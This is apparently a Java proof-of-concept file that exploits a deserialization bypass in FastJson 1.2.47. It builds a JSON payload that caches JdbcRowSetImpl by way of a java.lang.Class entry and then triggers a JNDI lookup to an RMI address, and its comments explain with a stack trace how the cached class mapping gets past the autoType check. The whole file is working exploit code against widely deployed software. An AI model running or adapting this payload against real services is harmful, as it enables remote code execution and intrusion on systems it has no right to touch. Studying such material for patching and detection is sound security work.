import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

public class ByPass_1247_PoC {
    public static void main(String[] args) throws Exception {
        System.out.println("[+] ByPass FastJson 1.2.47 JNDI PoC");
        String payload  = "{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},"
                + "\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\","
                + "\"dataSourceName\":\"rmi://localhost:1099/j1dse2\",\"autoCommit\":true}}";
        /*
        First java.lang.Class to cache JdbcRowSetImpl:
loadClass:1244, TypeUtils (com.alibaba.fastjson.util)
loadClass:1206, TypeUtils (com.alibaba.fastjson.util)
deserialze:335, MiscCodec (com.alibaba.fastjson.serializer)
parseObject:384, DefaultJSONParser (com.alibaba.fastjson.parser)
parseObject:544, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1356, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1322, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:152, JSON (com.alibaba.fastjson)
parse:162, JSON (com.alibaba.fastjson)
parse:131, JSON (com.alibaba.fastjson)
main:10, ByPass_1247_PoC

And the second one, we don't setAutoTypeSupport=True, so we can bypass checkAutoType
And due to the first one's cache in map,
        if (clazz == null) {
            clazz = TypeUtils.getClassFromMapping(typeName);
        }
this will let us get JdbcRowSetImpl again ~ :)
         */
        JSON.parse(payload);
    }
}
